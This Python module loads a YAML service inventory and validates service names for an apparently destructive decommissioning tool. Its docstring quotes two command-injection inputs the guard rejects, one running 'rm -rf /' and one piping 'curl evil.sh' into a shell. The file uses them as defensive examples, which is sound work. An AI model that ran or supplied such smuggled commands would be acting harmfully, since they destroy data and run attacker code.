"""Service inventory loading and name validation.

The inventory (services.yaml) is the single source of truth for "which
services are allowed to be decommissioned by this tool." Anything not in
it is rejected before any destructive step runs.
"""
from __future__ import annotations

import re
from dataclasses import dataclass
from pathlib import Path
from typing import List

import yaml

# DNS-label-shaped: lowercase alnum + hyphens, 1-63 chars, no leading/trailing
# hyphen. This is also what's safe to interpolate into kubectl namespace/
# deployment names and shell commands without quoting surprises.
SERVICE_NAME_RE = re.compile(r"^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$")


class InventoryError(Exception):
    """Raised for a missing/malformed inventory file or an unknown service."""


@dataclass(frozen=True)
class ServiceRecord:
    name: str
    owner: str = "unknown"
    tier: str = "unknown"


def load_inventory(path: Path) -> List[ServiceRecord]:
    if not path.exists():
        raise InventoryError(f"inventory file not found: {path}")

    with path.open("r", encoding="utf-8") as f:
        raw = yaml.safe_load(f) or []

    if not isinstance(raw, list):
        raise InventoryError("services.yaml must be a YAML list of service records")

    records = []
    seen = set()
    for entry in raw:
        if not isinstance(entry, dict) or "name" not in entry:
            raise InventoryError(f"malformed service entry: {entry!r}")
        name = entry["name"]
        validate_service_name(name)
        if name in seen:
            raise InventoryError(f"duplicate service entry: {name}")
        seen.add(name)
        records.append(
            ServiceRecord(
                name=name,
                owner=entry.get("owner", "unknown"),
                tier=entry.get("tier", "unknown"),
            )
        )
    return records


def validate_service_name(name: str) -> None:
    """Reject anything that isn't a safe, DNS-label-style identifier.

    This is the injection guardrail: a crafted value like
    "foo; rm -rf /" or "foo && curl evil.sh | sh" never reaches a shell
    or kubectl argument, because it fails this check first.
    """
    if not isinstance(name, str) or not SERVICE_NAME_RE.match(name):
        raise InventoryError(
            f"invalid service name {name!r}: must match {SERVICE_NAME_RE.pattern}"
        )


def find_service(records: List[ServiceRecord], name: str) -> ServiceRecord:
    validate_service_name(name)
    for r in records:
        if r.name == name:
            return r
    raise InventoryError(f"'{name}' is not in the service inventory (services.yaml)")
